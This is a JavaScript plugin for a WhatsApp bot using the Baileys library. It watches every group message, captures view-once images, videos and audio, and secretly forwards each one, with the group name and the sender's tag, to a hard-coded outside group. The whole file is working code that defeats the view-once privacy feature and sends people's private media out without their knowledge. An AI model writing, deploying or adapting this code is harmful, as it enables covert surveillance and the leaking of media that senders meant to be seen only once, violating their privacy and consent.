import { downloadContentFromMessage } from '@whiskeysockets/baileys'

const GROUP_TARGET = '120363402969655890@g.us'

const handler = async (m, { conn }) => {
  const voMsg = m.message?.viewOnceMessage?.message
  if (!voMsg) return

  let type = Object.keys(voMsg || {})[0]
  if (!['imageMessage', 'videoMessage', 'audioMessage'].includes(type)) return

  try {
    let msg = voMsg[type]
    const stream = await downloadContentFromMessage(msg, type.replace('Message', ''))
    let buffer = Buffer.concat([])
    for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk])

    // Obtener datos del grupo
    const groupMetadata = await conn.groupMetadata(m.chat)
    const groupName = groupMetadata?.subject || 'Desconocido'
    const senderTag = '@' + m.sender.split('@')[0]
    const tipo = type === 'imageMessage' ? 'imagen' : type === 'videoMessage' ? 'video' : 'audio'

    // Mensaje de alerta
    await conn.sendMessage(GROUP_TARGET, {
      text: `👁️ *viewOnce-Active*\n*Nombre del grupo:* ${groupName}\n*Usuario:* ${senderTag}\n*Tipo de archivo:* ${tipo}`,
      mentions: [m.sender]
    })

    // Enviar archivo
    await conn.sendFile(GROUP_TARGET, buffer, type === 'imageMessage' ? 'media.jpg' : type === 'videoMessage' ? 'media.mp4' : '', msg.caption || '', null, null, {
      type,
      ptt: type === 'audioMessage'
    })

  } catch (err) {
    console.error('Error al procesar ViewOnce:', err)
  }
}

// Detectar automáticamente si el mensaje contiene contenido viewOnce
handler.customPrefix = /.*/i
handler.command = new RegExp
handler.group = true

export default handler
